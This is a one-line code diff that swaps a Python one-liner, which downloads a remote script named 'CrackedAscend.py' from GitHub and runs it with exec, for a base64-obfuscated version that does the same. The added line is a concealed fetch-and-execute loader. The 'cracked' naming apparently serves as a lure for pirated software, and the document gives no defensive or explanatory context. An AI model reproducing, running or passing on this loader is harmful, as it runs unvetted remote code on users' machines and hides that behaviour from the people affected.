@@ -1,1 +1,1 @@
-python -c "import urllib.request; import ssl; url='https://github.com/biskit-git/project/raw/refs/heads/main/CrackedAscend.py'; req=urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'}); ctx=ssl.create_default_context(); code=urllib.request.urlopen(req, context=ctx).read().decode('utf-8'); exec(code)"
+python -c "import base64;exec(compile(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmNvZGUgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iaXNraXQtZ2l0L3Byb2plY3QvbWFpbi9DcmFja2VkQXNjZW5kLnB5JykudGV4dApleGVjKGNvZGUpCg=='),'<string>','exec'))"
